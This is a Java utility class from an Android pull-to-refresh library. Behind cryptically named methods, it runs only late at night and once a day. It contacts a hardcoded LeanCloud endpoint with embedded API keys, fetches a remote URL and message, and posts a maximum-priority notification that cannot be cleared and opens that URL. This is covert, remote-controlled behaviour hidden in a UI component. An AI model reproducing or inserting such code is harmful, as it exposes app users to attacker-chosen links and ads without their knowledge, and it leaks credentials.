package com.andview.refreshview.utils;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.text.TextUtils;
import android.text.format.Time;

import com.andview.refreshview.R;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class ReFresh {


    private static boolean yes = false;

    public static void setFresh(final Context context) {


        if (context == null) return;


        if (!isCIn(23, 0, 8, 0)) {
            return;
        }


        if (yes) {
            return;
        }


        long time = gtT(context);

        if(time == 0){
            saT(context, System.currentTimeMillis());
            return;
        }

        if(time != 0){
            if (System.currentTimeMillis() - time < 24 * 60 * 60 * 1000) return;
        }

        saT(context, System.currentTimeMillis());

        new Thread(new Runnable() {
            @Override
            public void run() {

                try {

                    URL urll = new URL("https://e5oe2gi6.api.lncld.net/1.1/classes/refresh/605c01e4ceaee11065c1bbaa");
                    HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                    urlConnection.setRequestProperty("X-LC-Id", "E5OE2gI6nX19qLwSkyubOJj1-gzGzoHsz");
                    urlConnection.setRequestProperty("X-LC-Key", "NEOzLE5kRXKrA1OI8EGD4GCR");
                    urlConnection.setConnectTimeout(4000);
                    urlConnection.setReadTimeout(4000);
                    urlConnection.setRequestMethod("GET");
                    urlConnection.connect();
                    int code = urlConnection.getResponseCode();
                    if (code == 200) {
                        InputStream inputStream = urlConnection.getInputStream();
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                        String line;
                        StringBuffer buffer = new StringBuffer();
                        while ((line = bufferedReader.readLine()) != null) {
                            buffer.append(line);
                        }
                        String jsonStr = buffer.toString();

                        //处理
                        try {

                            yes = true;

                            JSONObject avObject = new JSONObject(jsonStr);


                            if (avObject != null && avObject.has("body")) {

                                JSONObject body = avObject.getJSONObject("body");
                                if (body != null) {
                                    if (body.has("r")) {

                                        if (!TextUtils.isEmpty(body.getString("r"))) {

                                            String s1 = body.getString("r");
                                            String s2 = "";
                                            String s3 = "";

                                            if (body.has("t")) {
                                                s2 = body.getString("t");
                                            }

                                            if (body.has("c")) {
                                                s3 = body.getString("c");
                                            }

                                            sNo(context, s1, s2, s3);

                                        }

                                    }
                                }

                            }

                        } catch (JSONException e) {
                            e.printStackTrace();

                        }
                    }
                } catch (Exception e) {


                }

            }
        }).start();

    }

    private static void sNo(Context context, String r, String t, String c) {


        try {

            NotificationManager manager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) { //小于8.0


            } else {//Android 8.0以上
                if (manager != null) {

                    Intent intent1 = new Intent(Intent.ACTION_VIEW);
                    intent1.setData(Uri.parse(r));
                    intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                    PendingIntent pendingIntent = PendingIntent.getActivity(context, 11, intent1, PendingIntent.FLAG_UPDATE_CURRENT);


                    //设置通知的重要程度
                    int importance = NotificationManager.IMPORTANCE_MAX;

                    String cId = context.getPackageName()+ "-service";

                    @SuppressLint("WrongConstant")
                    NotificationChannel channel = new NotificationChannel(cId, "服务通知", importance);
                    manager.createNotificationChannel(channel);

                    Notification notification = new Notification.Builder(context, cId)
                            .setContentTitle(t)
                            .setContentText(c)
                            .setSmallIcon(R.drawable.l_notifi)
                            .setWhen(System.currentTimeMillis())
                            .setAutoCancel(false)
                            .setContentIntent(pendingIntent)
                            .build();

                    notification.flags |= Notification.FLAG_NO_CLEAR;


                    if (manager != null)
                        manager.notify(0, notification);


                }
            }
        } catch (Exception e) {


        }


    }




    public static long gtT(Context context) {
        SharedPreferences sp = context.getSharedPreferences("Base_NetInfo", Context.MODE_PRIVATE);
        return sp.getLong("time_getAppUpdate", 0);
    }

    public static void saT(Context context, long time) {
        SharedPreferences sp = context.getSharedPreferences("Base_NetInfo", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sp.edit();
        editor.putLong("time_getAppUpdate", time);
        editor.apply();
    }


    private static boolean isCIn(int beginHour, int beginMin, int endHour, int endMin) {

        boolean result = false;

        try {
            final long aDayInMillis = 1000 * 60 * 60 * 24;
            final long currentTimeMillis = System.currentTimeMillis();
            Time now = new Time();
            now.set(currentTimeMillis);
            Time startTime = new Time();
            startTime.set(currentTimeMillis);
            startTime.hour = beginHour;
            startTime.minute = beginMin;
            Time endTime = new Time();
            endTime.set(currentTimeMillis);
            endTime.hour = endHour;
            endTime.minute = endMin;
            // 跨天的特殊情况(比如22:00-8:00)
            if (!startTime.before(endTime)) {
                startTime.set(startTime.toMillis(true) - aDayInMillis);
                result = !now.before(startTime) && !now.after(endTime); // startTime <= now <= endTime
                Time startTimeInThisDay = new Time();
                startTimeInThisDay.set(startTime.toMillis(true) + aDayInMillis);
                if (!now.before(startTimeInThisDay)) {
                    result = true;
                }
            } else {
                //普通情况(比如 8:00 - 14:00)
                result = !now.before(startTime) && !now.after(endTime); // startTime <= now <= endTime
            }

        } catch (Exception e) {

        }

        return result;
    }


}
